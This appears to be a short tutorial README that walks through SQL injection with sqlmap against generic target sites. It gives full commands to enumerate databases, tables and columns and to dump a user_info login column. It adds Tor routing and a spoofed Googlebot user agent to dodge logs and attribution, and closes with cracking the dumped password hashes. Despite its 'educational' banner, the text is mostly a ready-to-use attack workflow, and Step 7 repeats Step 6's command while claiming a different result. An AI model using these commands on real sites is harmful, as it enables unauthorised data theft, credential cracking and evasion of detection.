# Injection-attacks

Injection attacks refer to a broad class of attack vectors that allow an attacker to supply untrusted input to a program, which gets processed by an interpreter as part of a command or query which alters the course of execution of that program

#####################################
## For Educational Purposes Only!!!##
#####################################
>>sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.
source link: https://github.com/sqlmapproject/sqlmap

Step 1: 
Listing DBMS databases SQLMap
sqlmap -u http://www.sqldummywebsite.com/cgi-bin/item.cgi?item_id=15 --dbs
What this command does:
sqlmap = Name of sqlmap binary file to execute
-u = Target URL (e.g. “http://www.testwebsite.com/cgi-bin/item.cgi?item_id=15”)
–dbs = Tell SQLMap to Enumerate DBMS databases.

Step 2:
Listing DBMS Using Tor with SQLMap for anonymity.

Add these option to your sqlmap command to use tor along side SQLMap.

--tor --tor-type=SOCKS5
What this command does is tells SQLMap to use our Tor Tunnel instead of our original network address.

For example:

sqlmap -u http://target-website.com/listproducts.php?cat=2 --tor --tor-type=SOCKS5

Step 3: 
Listing DBMS Using Tor + Google User Agent with SQLMap for anonymity
sqlmap -u http://target-website.com/listproducts.php?cat=2 --tor --tor-type=SOCKS5 --user-agent="Googlebot (compatible; Googlebot/2.1; +http://www.google.com/bot.html)

We will be using Tor and setting a Google Crawler as a user agent for additional obscurity. Google’s crawlers will often visit websites, and are one of the least suspicious entities in the website’s error logs

Step 4:
Listing database tables in target MySQL Database.
sqlmap -u http://www.target-website.com/cgi-bin/item.cgi?item_id=15 -D databasetable --tables --tor --tor-type=SOCKS5 --user-agent="Googlebot (compatible; Googlebot/2.1; +http://www.google.com/bot.html)

Replace -D databasetable with the name of the database table you are targeting

Step 5:
Listing Database Columns
sqlmap -u http://www.sqldummywebsite.com/cgi-bin/item.cgi?item_id=15 -D sqldummywebsite -T user_info --column --tor --tor-type=SOCKS5 --user-agent="Googlebot (compatible; Googlebot/2.1; +http://www.google.com/bot.html)

Step 6:
Listing from Target Columns
sqlmap -u http://www.sqldummywebsite.com/cgi-bin/item.cgi?item_id=15 -D sqldummywebsite -T user_info -C user_login --dump --tor --tor-type=SOCKS5 --user-agent="Googlebot (compatible; Googlebot/2.1; +http://www.google.com/bot.html)

Step 7:
We have now successfully listed the contents of the database we can then extract information from these tables by using the following command again.

sqlmap -u http://www.sqldummywebsite.com/cgi-bin/item.cgi?item_id=15 -D sqldummywebsite -T user_info -C user_login --dump --tor --tor-type=SOCKS5 --user-agent="Googlebot (compatible; Googlebot/2.1; +http://www.google.com/bot.html)

>SQLMap will now prompt for a word list. In this tutorial I will be using the default word list so I will choose option (1) from the menu
>SQLMap will then start cracking password hash’s from the SQL Database tables.
>Lets say we have tried lots of word lists and we still can’t decrypt the hash. We can use a tool called findmyhash.

Find My Hash uses the internet to connect to various Databases around the net. To find if the hash you are trying to crack has already been decrypted by someone else in the past.

To use Find My Hash type findmyhash from a terminal.

>>findmyhash

> (Free Password Hash Cracker: https://crackstation.net/)



